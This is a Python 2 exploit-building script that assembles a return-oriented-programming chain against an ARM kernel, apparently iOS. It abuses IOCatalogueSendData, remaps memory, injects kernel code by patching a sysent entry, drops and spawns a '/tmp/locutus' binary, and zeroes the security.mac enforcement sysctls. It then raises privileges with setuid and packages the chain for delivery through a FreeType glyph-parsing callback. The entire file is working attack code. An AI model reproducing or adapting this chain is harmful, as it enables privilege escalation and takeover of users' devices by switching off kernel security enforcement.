#!/opt/local/bin/python2.6
import sys, base64, shlex, zlib
import dmini
from world1 import *
import goo
import cPickle as pickle

if len(sys.argv) != 4:
    print >> sys.stderr, "usage: python catalog.py '-c cache' '-k kern' patchfile"
    sys.exit(1)

patchfile = open(sys.argv[3])

def read(f, size):
    result = f.read(size)
    if len(result) != size: raise Exception('truncated')
    return result

def dbg_result():
    # ensure that all of these are 0!
    if True:
        result, resultp = stackunkpair()
        store_r0_to(resultp)
        back = sys._getframe().f_back
        funcall('_printf', ptr('Result for %s:%d was %%08x\n' % (back.f_code.co_filename, back.f_lineno), True), result)

dmini.init(shlex.split(sys.argv[2]))

# mcr p15, 0, r0, c3, c0, 0; bx lr
mcrdude = dmini.cur.find_basic('- 10 0f 03 ee 1e ff 2f e1') + 0
# sub sp, r7, #20; pop {r8, r10}; pop {r4-r7, pc}
popdude = dmini.cur.find_multiple('+ a7 f1 14 0d bd e8 00 05 f0 bd', '?')

proc_ucred = dmini.cur.sym('_proc_ucred')

dmini.init(shlex.split(sys.argv[1]))

def wrap(num):
    if (num & 0xf0000000) == 0x30000000:
        return reloc(3, num, alignment=0x1000)
    else:
        return num
dmini.cur.wrap = wrap

ldm, stub, num_before_r0, num_after_r0 = dmini.cur.find_ldms(0x14414114)
#print hex(ldm), hex(stub), num_before_r0, num_after_r0

kernstuff = ([dontcare] * num_before_r0) + [0xffffffff] + ([dontcare] * num_after_r0) + [popdude, mcrdude]
kernstuff = struct.pack('I'*len(kernstuff), *kernstuff)

kernstuff += '\0' * ((-len(kernstuff) & 0xfff) + (stub & 0xfff))

plist = '<array><data>%s</data></array>' % base64.b64encode(kernstuff)

#init('R0', 'PC') # WTF
init('R4', 'R5', 'PC')
#set_fwd('R4', 0x12345678)
#set_fwd('R5', 0x87654321)
make_r7_avail()
m = marker()
set_sp_to(m)
m.mark()
heapadd(fwd('R7'), fwd('PC'))
make_avail()

funcall('_getpid', None)

load_r0_from(reloc(0xe, 0x558))
#load_r0_r0()
load_r0_r0()
zlocutusp, zlocutuspp = stackunkpair()
store_r0_to(zlocutuspp)
add_r0_by(reloc(0xc, 0))
zplistp, zplistpp = stackunkpair()
store_r0_to(zplistpp)

#funcall('_printf', ptr('starting shellcode\n', True))

#funcall('_exit', 0)

# before we remap, save 0x1000 so we can have it back
# we want to remap 
# find_kernel_ldm -> 0
# stub & ~0xfff -> 0x1000

funcall('_mach_task_self')
mtss = []
for i in xrange(9):
    mts, mtsp = stackunkpair()
    store_r0_to(mtsp)
    mtss.append(mts)

sizep = ptrI(0x1000)
memory_entry, memory_entryp = stackunkpair()
funcall('_mach_make_memory_entry', None, sizep, 0x1000, 5, memory_entryp, 0); dbg_result()

protp = ptrI(0)
zerop = ptrI(0)
thousandp = ptrI(0x1000)
funcall('_vm_deallocate', mtss.pop(), 0, 0x2000); dbg_result()
funcall('_vm_remap', mtss.pop(), zerop, 0x1000, 1, 0, mtss.pop(), ldm & ~0xfff, 0, protp, protp, 2); dbg_result()
funcall('_vm_remap', mtss.pop(), thousandp, 0x1000, 1, 0, mtss.pop(), stub & ~0xfff, 0, protp, protp, 2); dbg_result()
funcall('_mlock', 0, 0x2000); dbg_result()
#funcall('_memcpy', 0x10000000, 0, 0x2000) # XXX

plist = '<array><data>%s</data></array>' % base64.b64encode(kernstuff)
zplist = zlib.compress(plist, 9)

funcall('_malloc', len(plist))
plistp, plistpp = stackunkpair()
store_r0_to(plistpp)
dmini.cur.push_file('/usr/lib/libz.dylib')
funcall('_uncompress', None, ptrI(len(plist)), zplistp, len(zplist))
dmini.cur.pop_file()
dbg_result()

#funcall('_abort')
dmini.cur.push_file('/System/Library/Frameworks/IOKit.framework/Versions/A/IOKit')
funcall('_IOCatalogueSendData', 0, 1, plistp, len(plist))
dmini.cur.pop_file()
dbg_result()

# copy the real code we want to run in the kernel
weirdfile = open('kcode.bin').read()[:-4] + struct.pack('I', proc_ucred)

# (and parse the patchfile)
while True:
    namelen = patchfile.read(4)
    if len(namelen) == 0: break
    if len(namelen) != 4: raise Exception('truncated')
    name = read(patchfile, struct.unpack('I', namelen)[0])
    addr, = struct.unpack('I', read(patchfile, 4))
    data = read(patchfile, struct.unpack('I', read(patchfile, 4))[0])
    if name == 'sysent patch':
        sysent_patch, = struct.unpack('I', data)
    elif name == 'sysent patch orig':
        sysent_patch_orig, = struct.unpack('I', data)
    elif name == 'scratch':
        scratch, = struct.unpack('I', data)
    if addr == 0 or len(data) == 0 or name.startswith('+'): # in place only
        continue
    weirdfile += struct.pack('II', addr, len(data)) + data

weirdfile += struct.pack('IIII', sysent_patch, 4, sysent_patch_orig, 0)

funcall('_memcpy', scratch, ptr(weirdfile), len(weirdfile))
store_val_to(scratch, sysent_patch)
funcall('_syscall', 0); dbg_result()

# we're back in sanity land, do some housekeeping
funcall('_munlock', 0, 0x2000); dbg_result()
funcall('_vm_deallocate', mtss.pop(), 0, 0x2000); dbg_result()
funcall('_vm_allocate', mtss.pop(), zerop, 0x1000, 0); dbg_result()
funcall('_vm_protect', mtss.pop(), 0, 0x1000, 0, 0); dbg_result()
funcall('_vm_map', mtss.pop(), thousandp, 0x1000, 1, 0, memory_entry, 0, 0, 5, 5, 2); dbg_result()

O_WRONLY = 0x0001
O_CREAT  = 0x0200
O_TRUNC  = 0x0400

funcall('_malloc', reloc(0xa, 0))
locutusp, locutuspp = stackunkpair()
store_r0_to(locutuspp)
dmini.cur.push_file('/usr/lib/libz.dylib')
funcall('_uncompress', None, ptrI(reloc(0xb, 0)), zlocutusp, reloc(0xa, 0))
dmini.cur.pop_file()
dbg_result()
locutus_str = ptr('/tmp/locutus', True)
funcall('_open', locutus_str, O_WRONLY | O_CREAT | O_TRUNC, 0755)
fd, fdp = stackunkpair()
store_r0_to(fdp)
#dbg_result()
funcall('_write', None, locutusp, reloc(0xb, 0))
dbg_result()
funcall('_close', fd)
dbg_result()
funcall('_posix_spawn', 0x11000000, locutus_str, 0, 0, ptrI(locutus_str, 0), zerop)
dbg_result()

funcall('_sysctlbyname', ptr('security.mac.proc_enforce', True), 0, 0, zerop, 4)
dbg_result()
funcall('_sysctlbyname', ptr('security.mac.vnode_enforce', True), 0, 0, zerop, 4)
dbg_result()

funcall('_geteuid')
funcall('_setuid', None); dbg_result()

#funcall('_printf', ptr('done with shellcode\n', True))

set_r0_to(1337)
fancy_set_sp_to(reloc(0xe, 0x60c)) # offset determined by experiment

final, relocs = finalize(reloc(0xd, 0))

#heapdump(None)

# add sp, #400; pop {r4, r5, pc}
parse_callback = dmini.cur.find_basic('+ 64 b0 30 bd').value
print hex(parse_callback)
dmini.cur.push_file('/System/Library/Frameworks/CoreGraphics.framework/Resources/libCGFreetype.A.dylib')
actual_parse_callback = dmini.cur.private_sym('_T1_Parse_Glyph').value

#print 'len:', len(final), '/ 4 =', len(final)/4
#print relocs
#print map(hex, struct.unpack('I'*(len(final)/4), final))

#final = 'food'*500
#relocs = {4: 3}

open('catalog.txt', 'w').write(pickle.dumps({'parse_callback': parse_callback, 'actual_parse_callback': actual_parse_callback, 'final': final, 'relocs': relocs, 'plist': zplist}))
